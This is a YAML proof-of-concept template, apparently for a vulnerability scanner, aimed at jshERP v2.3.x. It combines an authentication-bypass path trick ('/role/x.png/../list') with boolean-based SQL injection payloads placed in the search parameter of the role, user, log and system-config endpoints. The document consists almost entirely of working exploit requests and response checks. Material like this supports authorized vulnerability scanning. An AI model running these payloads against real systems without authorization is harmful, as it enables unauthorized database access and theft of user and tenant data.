name: poc-yaml-jsherp-multiple-sqli
binding: 82b09adc-683e-4bb6-a09c-215c589b6127
manual: true
detail:
    author: secking
    links:
        - https://github.com/jishenghua/jshERP
        - https://cdn.modb.pro/db/546938
    vulnerability:
        id: CT-529840
        level: high
    description: 华夏ERP v2.3.x 版本大量接口存在SQL注入,结合认证绕过漏洞可以直接注入。
transport: http
set:
    s1: randomLowercase(5)
    a1: randomInt(10000, 100000)
    a2: randomInt(10000, 100000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /role/{{s1}}.png/../list?search=%7B%22name%22%3A%22%27and%20{{a1}}={{a2}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("data"))
    r1:
        request:
            cache: true
            method: GET
            path: /role/{{s1}}.png/../list?search=%7B%22name%22%3A%22%27and%20{{a1}}={{a1}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("deleteFlag")) && response.body.bcontains(bytes("tenantId"))
    r2:
        request:
            cache: true
            method: GET
            path: /user/{{s1}}.png/../list?search=%7B%22userName%22%3A%22%27and%20{{a1}}={{a2}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%2C%22loginName%22%3A%22%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("data"))
    r3:
        request:
            cache: true
            method: GET
            path: /user/{{s1}}.png/../list?search=%7B%22userName%22%3A%22%27and%20{{a1}}={{a1}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%2C%22loginName%22%3A%22%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes("loginName")) && response.body.bcontains(bytes("tenantId"))
    r4:
        request:
            cache: true
            method: GET
            path: /log/{{s1}}.png/../list?search=%7B%22operation%22%3A%22%27and%20{{a1}}={{a2}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%2C%22userId%22%3A%22%22%2C%22clientIp%22%3A%22%22%2C%22status%22%3A%22%22%2C%22beginTime%22%3A%22%22%2C%22endTime%22%3A%22%22%2C%22content%22%3A%22%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("data"))
    r5:
        request:
            cache: true
            method: GET
            path: /log/{{s1}}.png/../list?search=%7B%22operation%22%3A%22%27and%20{{a1}}={{a1}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%2C%22userId%22%3A%22%22%2C%22clientIp%22%3A%22%22%2C%22status%22%3A%22%22%2C%22beginTime%22%3A%22%22%2C%22endTime%22%3A%22%22%2C%22content%22%3A%22%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes("userName")) && response.body.bcontains(bytes("tenantId"))
    r6:
        request:
            cache: true
            method: GET
            path: /systemConfig/{{s1}}.png/../list?search=%7B%22companyName%22%3A%22%27and%20{{a1}}={{a2}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("data"))
    r7:
        request:
            cache: true
            method: GET
            path: /systemConfig/{{s1}}.png/../list?search=%7B%22companyName%22%3A%22%27and%20{{a1}}={{a1}}%20and%20%27{{s1}}%27=%27{{s1}}%27--+%22%7D&currentPage=1&pageSize=10&t=
            headers:
                Accept: application/json
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes("companyName")) && response.body.bcontains(bytes("companyAddress"))
expression: r0() && r1() || r2() && r3() || r4() && r5() || r6() && r7()
